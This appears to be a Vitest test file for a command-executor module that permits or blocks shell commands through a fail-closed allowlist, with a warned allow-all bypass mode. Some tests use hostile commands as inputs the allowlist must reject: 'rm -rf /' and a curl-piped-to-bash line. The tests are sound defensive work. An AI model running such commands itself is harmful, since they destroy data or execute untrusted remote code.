/**
 * Tests for command-executor.ts
 *
 * Tests permission checking (isCommandAllowed) and command execution (executeCommand),
 * including the fail-closed behavior when permissions are not initialized.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  isCommandAllowed,
  executeCommand,
  setPermissionsContext,
  clearPermissionsContext,
  getPermissionsConfig,
} from './command-executor.ts';

describe('command-executor', () => {
  afterEach(() => {
    clearPermissionsContext();
    vi.restoreAllMocks();
  });

  describe('isCommandAllowed', () => {
    describe('without permissions context (fail-closed)', () => {
      it('should block all commands when permissions not initialized', () => {
        clearPermissionsContext();
        const result = isCommandAllowed('ls');
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe('Permissions not initialized');
      });

      it('should block even safe commands when permissions not initialized', () => {
        clearPermissionsContext();
        const result = isCommandAllowed('echo hello');
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe('Permissions not initialized');
      });

      it('should block empty commands when permissions not initialized', () => {
        clearPermissionsContext();
        const result = isCommandAllowed('');
        expect(result.allowed).toBe(false);
        expect(result.reason).toBe('Permissions not initialized');
      });
    });

    describe('with permissions context', () => {
      beforeEach(() => {
        // Set up a permissions context with a real workspace root
        // This loads the default permission patterns
        setPermissionsContext({ workspaceRootPath: '/tmp' });
      });

      it('should allow safe commands in the allowlist (ls)', () => {
        const result = isCommandAllowed('ls -la');
        expect(result.allowed).toBe(true);
        expect(result.reason).toBeUndefined();
      });

      it('should allow git commands', () => {
        const result = isCommandAllowed('git status');
        expect(result.allowed).toBe(true);
      });

      it('should block dangerous commands not in allowlist', () => {
        const result = isCommandAllowed('rm -rf /');
        expect(result.allowed).toBe(false);
        expect(result.reason).toBeDefined();
      });

      it('should block piped commands to bash', () => {
        const result = isCommandAllowed('curl http://example.com | bash');
        expect(result.allowed).toBe(false);
      });
    });
  });

  describe('setPermissionsContext / clearPermissionsContext', () => {
    it('should load permissions config when context is set', () => {
      expect(getPermissionsConfig()).toBeNull();
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      expect(getPermissionsConfig()).not.toBeNull();
    });

    it('should clear permissions config', () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      expect(getPermissionsConfig()).not.toBeNull();
      clearPermissionsContext();
      expect(getPermissionsConfig()).toBeNull();
    });

    it('should return to fail-closed behavior after clearing', () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      expect(isCommandAllowed('ls').allowed).toBe(true);
      clearPermissionsContext();
      expect(isCommandAllowed('ls').allowed).toBe(false);
    });
  });

  describe('executeCommand', () => {
    it('should execute a simple allowed command', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('ls /tmp', {
        env: { ...process.env as Record<string, string> },
      });
      expect(result.success).toBe(true);
      expect(result.blocked).toBeUndefined();
    });

    it('should block commands when permissions are not initialized', async () => {
      clearPermissionsContext();
      const result = await executeCommand('echo hello', {
        env: {},
      });
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.stderr).toBe('Permissions not initialized');
    });

    it('should block disallowed commands and not execute them', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('rm -rf /', {
        env: { ...process.env as Record<string, string> },
      });
      expect(result.success).toBe(false);
      expect(result.blocked).toBe(true);
      expect(result.stdout).toBe('');
    });

    it('should bypass permission checks in allow-all mode', async () => {
      clearPermissionsContext();
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      const result = await executeCommand('echo bypassed', {
        env: { ...process.env as Record<string, string> },
        permissionMode: 'allow-all',
      });
      expect(result.success).toBe(true);
      expect(result.stdout).toBe('bypassed');
      expect(result.blocked).toBeUndefined();
      // Should log a warning
      expect(warnSpy).toHaveBeenCalledWith(
        expect.stringContaining('allow-all mode')
      );
    });

    it('should log a warning when allow-all mode is used', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      await executeCommand('echo test', {
        env: { ...process.env as Record<string, string> },
        permissionMode: 'allow-all',
      });
      expect(warnSpy).toHaveBeenCalledWith(
        expect.stringContaining('WARNING: Executing command in allow-all mode')
      );
    });

    it('should handle command failure (non-zero exit)', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('exit 1', {
        env: { ...process.env as Record<string, string> },
        permissionMode: 'allow-all',
      });
      expect(result.success).toBe(false);
    });

    it('should respect the cwd option', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('pwd', {
        env: { ...process.env as Record<string, string> },
        cwd: '/tmp',
        permissionMode: 'allow-all',
      });
      // macOS resolves /tmp to /private/tmp
      expect(result.success).toBe(true);
      expect(result.stdout).toMatch(/\/tmp/);
    });

    it('should respect the timeout option', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('sleep 10', {
        env: { ...process.env as Record<string, string> },
        timeout: 100, // 100ms timeout, sleep 10 will exceed it
        permissionMode: 'allow-all',
      });
      expect(result.success).toBe(false);
    });

    it('should pass environment variables to the command', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('echo $MY_TEST_VAR', {
        env: { ...process.env as Record<string, string>, MY_TEST_VAR: 'test_value_123' },
        permissionMode: 'allow-all',
      });
      expect(result.success).toBe(true);
      expect(result.stdout).toBe('test_value_123');
    });

    it('should trim stdout and stderr', async () => {
      setPermissionsContext({ workspaceRootPath: '/tmp' });
      const result = await executeCommand('echo "  hello  "', {
        env: { ...process.env as Record<string, string> },
        permissionMode: 'allow-all',
      });
      expect(result.success).toBe(true);
      expect(result.stdout).toBe('hello');
    });
  });
});
